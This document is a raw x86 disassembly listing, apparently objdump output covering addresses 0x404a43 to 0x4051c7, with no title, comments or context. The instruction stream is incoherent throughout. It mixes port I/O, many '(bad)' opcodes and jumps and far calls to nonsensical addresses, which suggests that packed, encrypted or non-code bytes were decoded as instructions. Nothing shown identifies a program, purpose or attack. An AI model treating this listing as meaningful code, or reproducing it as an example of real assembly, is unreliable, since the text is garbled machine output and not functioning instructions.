  404a43:	outs   dx,DWORD PTR ds:[esi]
  404a44:	cmp    cl,dh
  404a46:	mov    cl,0xf7
  404a48:	in     eax,dx
  404a49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a4a:	add    ah,BYTE PTR [ebx-0x20]
  404a4d:	enter  0x21a4,0x4
  404a51:	mov    bh,0x89
  404a53:	jl     0x404aaf
  404a55:	and    DWORD PTR [esi],edi
  404a57:	imul   edi,DWORD PTR [edi-0x791b3b83],0xfffffffa
  404a5e:	or     ecx,DWORD PTR [ebp-0x1fd8e619]
  404a64:	jge    0x404ab5
  404a66:	mov    ah,0xeb
  404a68:	and    BYTE PTR [ebp-0x11],0x5d
  404a6c:	push   es
  404a6d:	mov    BYTE PTR [eax+0x7f],0xcf
  404a71:	fcomp  DWORD PTR [ebx+0x4a]
  404a74:	add    al,BYTE PTR [ecx]
  404a76:	into   
  404a77:	lock leave 
  404a79:	jmp    0x404aa1
  404a7b:	(bad)  
  404a7c:	pop    esp
  404a7d:	shl    BYTE PTR [ebp-0x37],1
  404a80:	test   DWORD PTR [esi],eax
  404a82:	xlat   BYTE PTR ds:[ebx]
  404a83:	hlt    
  404a84:	mov    eax,0xcd476001
  404a89:	sbb    eax,DWORD PTR [esp+ecx*1]
  404a8c:	jbe    0x404adc
  404a8e:	push   ecx
  404a8f:	retf   0x877b
  404a92:	iret   
  404a93:	mov    al,ds:0xbc6a3faf
  404a98:	(bad)  
  404a99:	out    0xd7,eax
  404a9b:	mov    al,0x98
  404a9d:	inc    esp
  404a9e:	loope  0x404a2a
  404aa0:	iret   
  404aa1:	xchg   ebp,eax
  404aa2:	xchg   esp,eax
  404aa3:	cmp    eax,0xd93ae6ae
  404aa8:	ss xchg ebx,eax
  404aaa:	push   ebx
  404aab:	int    0x4e
  404aad:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  404aaf:	hlt    
  404ab0:	cli    
  404ab1:	pop    edi
  404ab2:	xchg   esp,eax
  404ab3:	pop    ebx
  404ab4:	add    esp,DWORD PTR [ebp+0x4c]
  404ab7:	xchg   edi,eax
  404ab8:	mov    ah,BYTE PTR [ecx+0x70]
  404abb:	and    al,0xdd
  404abd:	jg     0x404b39
  404abf:	hlt    
  404ac0:	rcl    BYTE PTR ds:0x1d51f36e,1
  404ac6:	add    ch,BYTE PTR [ebx+0x11]
  404ac9:	hlt    
  404aca:	mov    al,0x64
  404acc:	sub    DWORD PTR [edi+0xf17ecda],esi
  404ad2:	mov    al,ds:0x8102275a
  404ad7:	sub    edi,DWORD PTR [ecx]
  404ad9:	sub    DWORD PTR [ebx-0x5440238e],ebx
  404adf:	call   0x1b5a7309
  404ae4:	lods   al,BYTE PTR ds:[esi]
  404ae5:	mov    dh,0xe9
  404ae7:	imul   edx,DWORD PTR [edx],0x48
  404aea:	push   ebp
  404aeb:	sub    esi,DWORD PTR [esi]
  404aed:	ins    DWORD PTR es:[edi],dx
  404aee:	ret    0xdc5c
  404af1:	mov    ds:0x95d8056c,al
  404af6:	jmp    DWORD PTR [eax]
  404af8:	pop    ecx
  404af9:	xlat   BYTE PTR ds:[ebx]
  404afa:	cmp    BYTE PTR [ecx],ah
  404afc:	push   eax
  404afd:	inc    edi
  404afe:	dec    DWORD PTR ds:[ecx]
  404b01:	shr    cl,0xe8
  404b04:	jo     0x404aff
  404b06:	xor    BYTE PTR [ebx+0x69206f73],al
  404b0c:	push   ds
  404b0d:	shl    BYTE PTR [esi+0x3b],0x84
  404b11:	das    
  404b12:	(bad)  
  404b13:	and    ecx,DWORD PTR [edi]
  404b15:	inc    ebp
  404b16:	adc    cl,BYTE PTR [eax-0x76949084]
  404b1c:	addr16 out 0x5c,al
  404b1f:	outs   dx,BYTE PTR fs:[esi]
  404b21:	jne    0x404aee
  404b23:	mov    al,ds:0xea128e82
  404b28:	out    dx,eax
  404b29:	in     eax,0xc6
  404b2b:	(bad)  [esi+0x1e073e93]
  404b31:	les    ecx,FWORD PTR [esi+0x44]
  404b34:	mov    esp,0x30606ab6
  404b39:	icebp  
  404b3a:	scas   al,BYTE PTR es:[edi]
  404b3b:	adc    edx,DWORD PTR [esp+edi*1]
  404b3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b3f:	push   ecx
  404b40:	cmp    dh,al
  404b42:	retf   0x31
  404b45:	out    0x3e,eax
  404b47:	data16 fisubr WORD PTR [edx+0x4d]
  404b4b:	pop    edx
  404b4c:	rcl    BYTE PTR [edi+0x465f08ff],cl
  404b52:	ret    
  404b53:	or     DWORD PTR [edi-0xa],esp
  404b56:	sbb    eax,DWORD PTR ds:0x92ff7629
  404b5c:	pop    es
  404b5d:	out    0x53,eax
  404b5f:	mov    ds:0xee03295,eax
  404b64:	out    0x79,al
  404b66:	arpl   WORD PTR [edi],bx
  404b68:	push   cs
  404b69:	stos   BYTE PTR es:[edi],al
  404b6a:	sub    esp,DWORD PTR [ebp-0x66087269]
  404b70:	in     eax,dx
  404b71:	test   BYTE PTR [esi+0x13],0x7f
  404b75:	mov    bh,0x78
  404b77:	loope  0x404bf7
  404b79:	add    al,0xdf
  404b7b:	imul   DWORD PTR [eax]
  404b7d:	fbld   TBYTE PTR [ecx+eax*8+0x65c7c6fe]
  404b84:	pushf  
  404b85:	xchg   DWORD PTR [ecx+0x2f923df9],ecx
  404b8b:	out    0xc7,al
  404b8d:	xchg   ecx,edi
  404b8f:	fnsave [ebp+0x63327c93]
  404b95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b96:	add    esi,DWORD PTR [edx]
  404b98:	(bad)  
  404b9a:	mov    ch,0x7c
  404b9c:	ret    
  404b9d:	loop   0x404bbf
  404b9f:	mov    edx,0x8068f5c4
  404ba4:	fwait
  404ba5:	push   ss
  404ba6:	or     ecx,DWORD PTR [ebx+edx*4+0x15]
  404baa:	or     bh,BYTE PTR [ebx+edx*2+0x6]
  404bae:	jmp    0x53715575
  404bb3:	aam    0x82
  404bb5:	ret    0xeb8
  404bb8:	popf   
  404bb9:	test   DWORD PTR [edi-0x29],eax
  404bbc:	jbe    0x404bb3
  404bbe:	into   
  404bbf:	js     0x404bf4
  404bc1:	lds    ecx,FWORD PTR [ebx-0x55]
  404bc4:	adc    DWORD PTR [ebp-0x2cd09a92],esi
  404bca:	sar    DWORD PTR [ebx+0x3a],1
  404bcd:	ja     0x404c23
  404bcf:	pop    ebx
  404bd0:	cmp    DWORD PTR ds:0x70ff5640,eax
  404bd6:	dec    ecx
  404bd7:	out    dx,eax
  404bd8:	arpl   WORD PTR [edi],bp
  404bda:	jb     0x404b8e
  404bdc:	out    0x80,al
  404bde:	adc    al,0xd8
  404be0:	enter  0xe9c6,0x5f
  404be4:	fadd   QWORD PTR [esi]
  404be6:	aas    
  404be7:	mov    edi,0x85dbc2e
  404bec:	mov    al,ds:0x913ff300
  404bf1:	das    
  404bf2:	pop    edi
  404bf3:	or     eax,0x8ab5d392
  404bf8:	jecxz  0x404c75
  404bfa:	(bad)  
  404bfb:	sbb    ebp,DWORD PTR [edx]
  404bfd:	(bad)  
  404bfe:	idiv   BYTE PTR [edi+0x51451f34]
  404c04:	or     DWORD PTR [edx],esi
  404c06:	adc    al,0xea
  404c08:	imul   edi,DWORD PTR [ebp-0x1a],0x7d
  404c0c:	push   0x39
  404c0e:	mov    esi,0x3c3de5f6
  404c13:	mov    esi,0x10cef4e6
  404c18:	out    dx,al
  404c19:	pop    eax
  404c1a:	mov    bh,0xaa
  404c1c:	dec    ebx
  404c1d:	cwde   
  404c1e:	lock cmp cl,al
  404c21:	gs (bad) 
  404c23:	mov    ah,0xec
  404c25:	xor    eax,0x393e7f22
  404c2a:	mov    es,WORD PTR [edi+0x13]
  404c2d:	add    BYTE PTR [edx+0x183b7668],dl
  404c33:	sbb    BYTE PTR [ebx],bl
  404c35:	jmp    0xbf4d3f0c
  404c3a:	aam    0x63
  404c3c:	shl    BYTE PTR [esi+ebx*4+0x6b],0x9
  404c41:	(bad)  
  404c42:	out    dx,eax
  404c43:	ja     0x404bcb
  404c45:	ins    BYTE PTR es:[edi],dx
  404c46:	test   eax,0xb7f5584e
  404c4b:	push   ecx
  404c4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c4d:	mov    ds:0x2e7b24a6,eax
  404c52:	xchg   ecx,eax
  404c53:	jl     0x404c67
  404c55:	out    0xcc,al
  404c57:	je     0x404c9a
  404c59:	call   0x1448c782
  404c5e:	pop    ecx
  404c5f:	test   al,0xa3
  404c61:	je     0x404c7c
  404c63:	lods   eax,DWORD PTR ds:[esi]
  404c64:	add    bl,BYTE PTR [eax+0x2d]
  404c67:	sub    eax,0x4ce35b98
  404c6c:	fisub  WORD PTR [ebx]
  404c6e:	or     DWORD PTR [eax],edi
  404c70:	push   edx
  404c71:	pop    ss
  404c72:	retf   0xa297
  404c75:	test   al,0x6d
  404c77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c78:	lods   al,BYTE PTR ds:[esi]
  404c79:	das    
  404c7a:	and    DWORD PTR [ebx-0x2d],0xe64146e0
  404c81:	das    
  404c82:	shl    dl,cl
  404c84:	das    
  404c85:	ds std 
  404c87:	add    ch,BYTE PTR [eax+esi*4]
  404c8a:	and    ch,BYTE PTR [esi+0x12]
  404c8d:	mov    ecx,0xda3e75a4
  404c92:	mov    eax,ds:0x213cbd43
  404c97:	dec    eax
  404c98:	and    dl,bh
  404c9a:	fnstcw WORD PTR [edx]
  404c9c:	mov    eax,0x1e131860
  404ca1:	repnz pop esi
  404ca3:	jmp    0xf12aedeb
  404ca8:	inc    ecx
  404ca9:	(bad)
  404cac:	push   esi
  404cad:	loop   0x404c90
  404caf:	cs jle 0x404c62
  404cb2:	jno    0x404d21
  404cb4:	jne    0x404ca7
  404cb6:	inc    edi
  404cb7:	fcom   QWORD PTR [edx]
  404cb9:	push   0xe9bf6c24
  404cbe:	call   0xf62c50d2
  404cc3:	mov    eax,0xab7a0c37
  404cc8:	cdq    
  404cc9:	push   esp
  404cca:	call   0x4a8c:0xeceb8f5
  404cd1:	das    
  404cd2:	sub    eax,0x1b7d2b77
  404cd7:	and    ch,BYTE PTR [edx+edi*1-0x6]
  404cdb:	stos   BYTE PTR es:[edi],al
  404cdc:	fld    DWORD PTR [esi]
  404cde:	(bad)  
  404cdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ce0:	pop    ebp
  404ce1:	inc    esi
  404ce2:	fs cld 
  404ce4:	test   ecx,esp
  404ce6:	jl     0x404cb3
  404ce8:	push   0x49e21e53
  404ced:	ret    0xf585
  404cf0:	sbb    BYTE PTR [ebp-0x7e],dh
  404cf3:	lods   eax,DWORD PTR ds:[esi]
  404cf4:	cld    
  404cf5:	or     bh,BYTE PTR [esi-0x6d0fb234]
  404cfb:	neg    edx
  404cfd:	cmp    BYTE PTR [esi+0x5461926f],al
  404d03:	cmp    eax,0x86cd8309
  404d08:	mov    dh,0x79
  404d0a:	xor    esi,esi
  404d0c:	cld    
  404d0d:	sbb    ecx,DWORD PTR [esi-0x65f7fbdd]
  404d13:	leave  
  404d14:	inc    edx
  404d15:	mov    esi,0x913d3aab
  404d1a:	(bad)  
  404d1b:	std    
  404d1c:	cmp    cl,BYTE PTR [ebx]
  404d1e:	pop    edx
  404d1f:	loop   0x404d98
  404d21:	pop    ebx
  404d22:	dec    esp
  404d23:	ror    BYTE PTR [ecx],0xe8
  404d26:	ins    BYTE PTR es:[edi],dx
  404d27:	cmp    edx,DWORD PTR [edx-0x26]
  404d2a:	mov    eax,0xbaade4f5
  404d2f:	pop    ebx
  404d30:	add    eax,0xe1db03d8
  404d35:	inc    eax
  404d36:	add    DWORD PTR [edi],0xffffffa9
  404d39:	outs   dx,BYTE PTR ds:[esi]
  404d3a:	ds pop ds
  404d3c:	and    eax,0xa951dfa1
  404d41:	aas    
  404d42:	mov    esp,0x88a2c7e3
  404d47:	and    edx,DWORD PTR [ebp+0x59b8afed]
  404d4d:	push   cs
  404d4e:	fbstp  TBYTE PTR [edx]
  404d50:	mov    cl,0x94
  404d52:	jns    0x404dce
  404d54:	adc    ebp,DWORD PTR [esi]
  404d56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d57:	adc    esi,DWORD PTR [eax-0x18106d6c]
  404d5d:	jg     0x404d4d
  404d5f:	test   eax,0xa7f2bfef
  404d64:	sar    BYTE PTR [eax],1
  404d66:	cld    
  404d67:	mov    ch,0x8e
  404d69:	jp     0x404dc5
  404d6b:	rcr    BYTE PTR [ebp+0x25],1
  404d6e:	test   eax,0xd4ebddde
  404d73:	xor    BYTE PTR [edi+0x8],ch
  404d76:	cmp    esp,DWORD PTR [edx+0x46]
  404d79:	xchg   ebx,eax
  404d7a:	xchg   edx,eax
  404d7b:	arpl   WORD PTR [ebp+0x42b805ca],si
  404d81:	dec    esp
  404d82:	ret    0xbff0
  404d85:	xchg   edx,eax
  404d86:	push   ebp
  404d87:	dec    edi
  404d88:	clc    
  404d89:	jmp    0xe333743a
  404d8e:	mov    ebx,0x872a4164
  404d93:	outs   dx,BYTE PTR ds:[esi]
  404d94:	adc    BYTE PTR [eax+0x55759a63],dh
  404d9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d9b:	inc    eax
  404d9c:	sbb    DWORD PTR [edi+ecx*1-0x6a3fd01],edx
  404da3:	jb     0x404dda
  404da5:	push   edi
  404da6:	mov    esp,0x142cc6b
  404dab:	pop    ebx
  404dac:	add    al,0x74
  404dae:	mov    al,ds:0xf2d8e6cb
  404db3:	jo     0x404e12
  404db5:	sub    esp,DWORD PTR [esi-0x57e375a1]
  404dbb:	popf   
  404dbc:	test   eax,0x8ba06a87
  404dc1:	adc    al,0x86
  404dc3:	pop    es
  404dc4:	push   esi
  404dc5:	inc    edi
  404dc6:	xlat   BYTE PTR ds:[ebx]
  404dc7:	pextrw edi,(bad),0xc5
  404dc9:	mov    esp,0xc6842fc6
  404dce:	xlat   BYTE PTR ds:[ebx]
  404dcf:	ficom  DWORD PTR [esi-0x606eab1c]
  404dd5:	jl     0x404d7c
  404dd7:	pusha  
  404dd8:	add    eax,0x5615fd05
  404ddd:	xor    ah,BYTE PTR [eax+0x543e1dcb]
  404de3:	xchg   WORD PTR [edx],di
  404de6:	sbb    ebx,ebp
  404de8:	cmp    dh,ch
  404dea:	xchg   ebx,eax
  404deb:	adc    bl,0x9d
  404dee:	shl    BYTE PTR [ebp+0xb032fba],1
  404df4:	idiv   DWORD PTR [edx-0x181a69c8]
  404dfa:	retf   0x5db5
  404dfd:	ins    BYTE PTR es:[edi],dx
  404dfe:	pop    ecx
  404dff:	mov    eax,ds:0x3de0ac76
  404e04:	sahf   
  404e05:	out    dx,al
  404e06:	or     DWORD PTR [edi-0x35],ecx
  404e09:	sub    BYTE PTR [esi],0xee
  404e0c:	lods   al,BYTE PTR ds:[esi]
  404e0d:	pop    esp
  404e0e:	push   0xbb9647e7
  404e13:	or     edx,DWORD PTR [esi]
  404e15:	popf   
  404e16:	call   0xca2d:0xb01a573a
  404e1d:	jno    0x404e3b
  404e1f:	sti    
  404e20:	push   ss
  404e21:	sub    BYTE PTR [edi+0xa],dh
  404e24:	rol    ch,cl
  404e26:	add    DWORD PTR [edi-0x63],esp
  404e29:	loope  0x404e19
  404e2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e2c:	dec    eax
  404e2d:	ja     0x404db8
  404e2f:	dec    ebx
  404e30:	into   
  404e31:	jg     0x404e64
  404e33:	inc    ecx
  404e34:	push   esi
  404e35:	xchg   esi,eax
  404e36:	test   eax,0x5865328c
  404e3b:	jmp    0x404dd9
  404e3d:	jg     0x404e18
  404e3f:	int    0x95
  404e41:	xor    DWORD PTR [eax],ebx
  404e43:	lods   al,BYTE PTR ds:[esi]
  404e44:	add    al,0x19
  404e46:	mov    ds:0x41566280,al
  404e4b:	mov    WORD PTR [eax-0x4d174d3f],gs
  404e51:	xor    al,0x33
  404e53:	jle    0x404e27
  404e55:	xchg   edx,eax
  404e56:	xlat   BYTE PTR ds:[ebx]
  404e57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e58:	ss push ds
  404e5a:	cmp    ecx,eax
  404e5c:	mov    edi,0xd06d5162
  404e61:	shr    eax,cl
  404e63:	jg     0x404e64
  404e65:	xor    edi,DWORD PTR [eax-0x4a3ac34a]
  404e6b:	addr16 nop
  404e6d:	add    DWORD PTR [ebp+0x21],esi
  404e70:	unpcklps xmm1,XMMWORD PTR [eax-0x69948d43]
  404e77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e78:	dec    BYTE PTR [ecx-0x1e]
  404e7b:	push   ds
  404e7c:	ja     0x404eb7
  404e7e:	xchg   ebx,eax
  404e7f:	xchg   ebx,eax
  404e80:	into   
  404e81:	inc    ecx
  404e82:	fs push edi
  404e84:	ds cmp cl,al
  404e87:	dec    ecx
  404e88:	dec    ebp
  404e89:	sub    DWORD PTR ds:0xfd2ad8c6,esp
  404e8f:	mov    edx,0xbee0e62b
  404e94:	adc    al,0x85
  404e96:	push   edx
  404e97:	scas   al,BYTE PTR es:[edi]
  404e98:	adc    eax,0x5de05a0d
  404e9d:	and    edx,DWORD PTR [edx-0x4f]
  404ea0:	push   es
  404ea1:	lods   eax,DWORD PTR ds:[esi]
  404ea2:	cmp    esi,DWORD PTR [esi+ebx*4-0x3a]
  404ea6:	pushf  
  404ea7:	jl     0x404f16
  404ea9:	xlat   BYTE PTR ds:[ebx]
  404eaa:	outs   dx,BYTE PTR ds:[esi]
  404eab:	jecxz  0x404e4c
  404ead:	test   eax,0x13739d42
  404eb2:	lods   al,BYTE PTR ds:[esi]
  404eb3:	inc    ecx
  404eb4:	jmp    0x426f214a
  404eb9:	push   ebp
  404eba:	aaa    
  404ebb:	push   ss
  404ebc:	outs   dx,BYTE PTR ds:[esi]
  404ebd:	push   ecx
  404ebe:	xchg   BYTE PTR [esi+edi*1-0xb1ee276],ah
  404ec5:	test   ch,ch
  404ec7:	cli    
  404ec8:	xor    BYTE PTR [edx+0x4],dh
  404ecb:	xor    bh,bl
  404ecd:	jmp    0xc4f40d6d
  404ed2:	int3   
  404ed3:	cli    
  404ed4:	and    ebx,DWORD PTR [edx]
  404ed6:	test   esp,esi
  404ed8:	(bad)  
  404ed9:	std    
  404eda:	inc    ebp
  404edb:	inc    ebx
  404edc:	push   es
  404edd:	scas   al,BYTE PTR es:[edi]
  404ede:	adc    DWORD PTR [edx+0x20ca5aa],0xffffffbd
  404ee5:	push   cs
  404ee6:	push   ds
  404ee7:	mov    bh,0x3e
  404ee9:	ror    BYTE PTR [ebp+0x168899e0],1
  404eef:	in     eax,0xf5
  404ef1:	inc    edx
  404ef2:	cmp    DWORD PTR [esi],eax
  404ef4:	add    esi,ebp
  404ef6:	cdq    
  404ef7:	lods   eax,DWORD PTR ds:[esi]
  404ef8:	ss mov ebp,0xb3aa78e1
  404efe:	mov    bl,0xb1
  404f00:	aad    0x65
  404f02:	(bad)
  404f06:	aad    0x5a
  404f08:	in     al,0x15
  404f0a:	out    0x50,al
  404f0c:	jl     0x404f1b
  404f0e:	ficomp WORD PTR [eax+0x68]
  404f11:	push   0xe885c378
  404f16:	xchg   ebx,eax
  404f17:	mov    cl,ah
  404f19:	xchg   edx,eax
  404f1a:	fsub   DWORD PTR [edi+ecx*2-0x67]
  404f1e:	adc    al,0x18
  404f20:	mov    eax,ds:0x60982530
  404f25:	scas   al,BYTE PTR es:[edi]
  404f26:	xor    al,0xc1
  404f28:	in     eax,dx
  404f29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f2a:	rcr    DWORD PTR ds:0x148f0dcf,0x1e
  404f31:	out    dx,eax
  404f32:	popf   
  404f33:	push   esi
  404f34:	shl    BYTE PTR [edi-0x5679a653],0x5e
  404f3b:	dec    ecx
  404f3c:	les    ecx,FWORD PTR [esi+0x22]
  404f3f:	push   ecx
  404f40:	cmp    al,BYTE PTR [edi+0x43fcb530]
  404f46:	fcmovnb st,st(4)
  404f48:	std    
  404f49:	jle    0x404fa9
  404f4b:	lea    eax,[ecx+0x53]
  404f4e:	mov    al,0xb9
  404f50:	sbb    DWORD PTR [ebx+eax*2+0x40],esi
  404f54:	dec    edi
  404f55:	jb     0x404f35
  404f57:	mov    BYTE PTR [edi-0x74da36cb],bl
  404f5d:	rcl    dl,cl
  404f5f:	pop    ss
  404f60:	aad    0xef
  404f62:	jae    0x404f9e
  404f64:	and    eax,0x52890ef
  404f69:	retf   0xce3d
  404f6c:	or     esi,ecx
  404f6e:	es jle 0x404f22
  404f71:	xor    al,BYTE PTR [eax]
  404f73:	ret    0x445a
  404f76:	sub    eax,0x3366534e
  404f7b:	cld    
  404f7c:	pushf  
  404f7d:	lods   eax,DWORD PTR ds:[esi]
  404f7e:	pop    ecx
  404f7f:	stos   BYTE PTR es:[edi],al
  404f80:	mov    dh,0xc6
  404f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f83:	(bad)  
  404f85:	sbb    bh,ah
  404f87:	mov    dl,0x88
  404f89:	mov    DWORD PTR [ebx-0x17],eax
  404f8c:	add    al,0x3a
  404f8e:	in     eax,dx
  404f8f:	gs jmp 0x7705:0x3963ae6
  404f97:	xor    esi,DWORD PTR [eax-0x14]
  404f9a:	dec    esi
  404f9b:	dec    esp
  404f9c:	test   eax,0xf3d964de
  404fa1:	aaa    
  404fa2:	cmp    ebx,DWORD PTR [esi-0x15f7eda0]
  404fa8:	dec    BYTE PTR [edi]
  404faa:	mov    dl,0xc6
  404fac:	mov    esp,0xf210ac7a
  404fb1:	ds loop 0x404fbc
  404fb4:	push   cs
  404fb5:	lea    edx,[ebp+ebp*1+0x8]
  404fb9:	lods   al,BYTE PTR ds:[esi]
  404fba:	hlt    
  404fbb:	retf   0xbf33
  404fbe:	dec    esi
  404fbf:	popf   
  404fc0:	outs   dx,DWORD PTR ds:[esi]
  404fc1:	loop   0x40500d
  404fc3:	push   ss
  404fc4:	aaa    
  404fc5:	add    BYTE PTR [ecx+ebx*2+0x2b6d77ab],cl
  404fcc:	out    0x2a,al
  404fce:	or     DWORD PTR [esi],esp
  404fd0:	(bad)  
  404fd1:	sub    DWORD PTR [ebp-0x464452b7],edx
  404fd7:	and    esi,DWORD PTR [edi+0x2f]
  404fda:	ror    BYTE PTR [ecx],1
  404fdc:	pop    esp
  404fdd:	out    dx,al
  404fde:	mov    ds:0x737009e0,al
  404fe3:	pop    ds
  404fe4:	inc    ecx
  404fe5:	or     eax,0xab6e5ed
  404fea:	mov    ebx,0x13d5cff7
  404fef:	push   ds
  404ff0:	mov    ebx,0x95f88568
  404ff5:	push   eax
  404ff6:	add    al,0xe6
  404ff8:	mov    eax,DWORD PTR [edi]
  404ffa:	sub    cl,BYTE PTR [ecx-0x6c]
  404ffd:	outs   dx,DWORD PTR ds:[esi]
  404ffe:	dec    edx
  404fff:	sbb    al,0x4a
  405001:	and    DWORD PTR [eax+0x59978c2c],eax
  405007:	in     eax,0xf4
  405009:	jne    0x40501f
  40500b:	ins    DWORD PTR es:[edi],dx
  40500c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40500d:	mov    eax,0xbee35b9c
  405012:	push   ebp
  405013:	xchg   BYTE PTR [esi-0x1d],dh
  405016:	imul   ecx,DWORD PTR [edx-0x1090132b],0x1c
  40501d:	inc    ebp
  40501e:	xchg   edx,eax
  40501f:	sbb    eax,0xfce1160
  405024:	xchg   esp,eax
  405025:	inc    esp
  405026:	stc    
  405027:	mov    al,ds:0x4cc2f49c
  40502c:	js     0x405060
  40502e:	mov    esi,0xc28f8218
  405033:	mov    edx,0xa2dc7eac
  405038:	and    dl,BYTE PTR [ebx]
  40503a:	pop    ds
  40503b:	mov    dh,0xc2
  40503d:	push   es
  40503e:	xor    edx,esi
  405040:	nop
  405041:	in     al,dx
  405042:	aam    0x1d
  405044:	push   DWORD PTR [edx]
  405046:	jecxz  0x40504d
  405048:	xchg   edi,eax
  405049:	aas    
  40504a:	mov    ch,0x8f
  40504c:	jle    0x40505c
  40504e:	mov    dh,0xb2
  405050:	mov    cl,0x4d
  405052:	push   es
  405053:	sub    DWORD PTR [edi],0x29
  405056:	into   
  405057:	(bad)  
  405059:	les    edx,FWORD PTR [eax]
  40505b:	cmp    BYTE PTR [edi+0x44420bda],0x78
  405062:	and    DWORD PTR [ecx+ebx*2+0x14894521],0x70916eb8
  40506d:	ins    BYTE PTR es:[edi],dx
  40506e:	cmp    ah,dh
  405070:	lods   al,BYTE PTR ds:[esi]
  405071:	fs lahf 
  405073:	pop    ss
  405074:	mov    ds:0xfec1e823,eax
  405079:	push   0x71
  40507b:	enter  0xf3e7,0x46
  40507f:	pop    ebx
  405080:	dec    edx
  405081:	dec    eax
  405082:	mov    al,ds:0x8c29a406
  405087:	mov    esi,0x1f583190
  40508c:	scas   eax,DWORD PTR es:[edi]
  40508d:	push   0x924dc49f
  405092:	or     BYTE PTR [edx+0x23],ch
  405095:	popa   
  405096:	xchg   edi,eax
  405097:	mov    fs,WORD PTR es:[eax+0x0]
  40509b:	xchg   ebx,eax
  40509c:	dec    esi
  40509d:	scas   al,BYTE PTR es:[edi]
  40509e:	jl     0x4050b6
  4050a0:	lock or ebx,DWORD PTR [edi+0x54]
  4050a4:	and    al,0x17
  4050a6:	adc    DWORD PTR [ecx+0x52],ebp
  4050a9:	xchg   DWORD PTR [ecx-0x2d],ebx
  4050ac:	fs loope 0x4050f4
  4050af:	outs   dx,BYTE PTR ds:[esi]
  4050b0:	rcr    BYTE PTR [ebx-0x78b60f2f],1
  4050b6:	fiadd  WORD PTR [ecx+0x5d]
  4050b9:	lds    esi,FWORD PTR ds:0xeca40a0b
  4050bf:	mov    bl,0x5b
  4050c1:	jno    0x4050c1
  4050c3:	jae    0x40511a
  4050c5:	lahf   
  4050c6:	cmp    ebx,eax
  4050c8:	int    0xc
  4050ca:	in     al,0x2d
  4050cc:	pop    ebp
  4050cd:	jb     0x405144
  4050cf:	mov    bh,0xca
  4050d1:	int    0xaf
  4050d3:	sbb    ebx,DWORD PTR [eax-0x52]
  4050d6:	inc    eax
  4050d7:	jb     0x405154
  4050d9:	xchg   ebp,eax
  4050da:	ret    
  4050db:	and    al,0x6d
  4050dd:	cmpxchg BYTE PTR [edi-0x71],bl
  4050e1:	push   ss
  4050e2:	xor    esi,0x1e
  4050e5:	mov    ds:0x2de3f9ab,al
  4050ea:	sbb    bh,ah
  4050ec:	push   ss
  4050ed:	jmp    0x5c942e6a
  4050f2:	(bad)  [edi]
  4050f4:	loope  0x4050db
  4050f6:	mov    esi,0xf22e1ebd
  4050fb:	aam    0xb6
  4050fd:	es mov esp,0xa06f084a
  405103:	mov    ds:0xee4e07d4,eax
  405108:	jnp    0x40514c
  40510a:	pop    edi
  40510b:	cmp    eax,esi
  40510d:	mov    eax,0x2a01d8a1
  405112:	inc    ebp
  405113:	push   ebx
  405114:	sub    DWORD PTR gs:[esi-0x70],ebp
  405118:	das    
  405119:	and    DWORD PTR ds:0x44b5bd59,esp
  40511f:	mov    DWORD PTR [ecx+esi*1],edx
  405122:	fisubr DWORD PTR [ebp-0x3564709f]
  405128:	int3   
  405129:	pop    ds
  40512a:	mov    esp,0x5e2ace0d
  40512f:	in     al,dx
  405130:	mov    ebp,0xd8d80223
  405135:	jne    0x4050e2
  405137:	stos   DWORD PTR es:[edi],eax
  405138:	hlt    
  405139:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40513a:	fucomp st(3)
  40513c:	sbb    esp,DWORD PTR [ebp-0x3d]
  40513f:	sub    al,0xf2
  405141:	adc    BYTE PTR [esi-0x7c],ah
  405144:	bnd jb 0x4050d3
  405147:	shl    BYTE PTR [edx],cl
  405149:	xor    eax,0xfadf85b4
  40514e:	(bad)  [edx]
  405150:	push   ebp
  405151:	pop    edi
  405152:	gs push eax
  405154:	push   esp
  405155:	(bad)  
  405156:	inc    BYTE PTR [eax+edx*1]
  405159:	push   0xffffffaa
  40515b:	adc    dl,al
  40515d:	fidivr WORD PTR [ecx+0x6b]
  405160:	data16 fdiv st(2),st
  405163:	cmp    eax,0x95b33ada
  405168:	ja     0x4051a8
  40516a:	sahf   
  40516b:	int    0x82
  40516d:	in     al,dx
  40516e:	in     eax,dx
  40516f:	loope  0x4051a2
  405171:	jo     0x40518b
  405173:	sub    eax,0xf75827b5
  405178:	into   
  405179:	ins    DWORD PTR es:[edi],dx
  40517a:	ins    DWORD PTR es:[edi],dx
  40517b:	mov    ah,0x7c
  40517d:	adc    dl,BYTE PTR [ebx+esi*2+0x13]
  405181:	sub    BYTE PTR [esi+0x7b1ffc05],dl
  405187:	inc    ecx
  405188:	dec    edx
  405189:	ins    BYTE PTR es:[edi],dx
  40518a:	loope  0x4051f4
  40518c:	jmp    0x8cb91900
  405191:	mov    bh,0x38
  405193:	imul   ecx,DWORD PTR [esi+0x2ee3cc23],0x99185039
  40519d:	push   ebx
  40519e:	fwait
  40519f:	inc    esp
  4051a0:	jb     0x405211
  4051a2:	nop
  4051a3:	(bad)
  4051a7:	and    bl,BYTE PTR cs:[edi-0x66]
  4051ab:	inc    esi
  4051ac:	inc    ecx
  4051ad:	jne    0x4051a4
  4051af:	cdq    
  4051b0:	stos   DWORD PTR es:[edi],eax
  4051b1:	inc    esi
  4051b2:	xchg   ecx,eax
  4051b3:	mov    esi,0x11c5cbc4
  4051b8:	or     al,0x71
  4051ba:	push   esi
  4051bb:	sub    dh,BYTE PTR [ebp-0x611af02c]
  4051c1:	test   dh,0xad
  4051c4:	ja     0x405182
  4051c6:	(bad)  
  4051c7:	add    dl,BYTE PTR [edi]
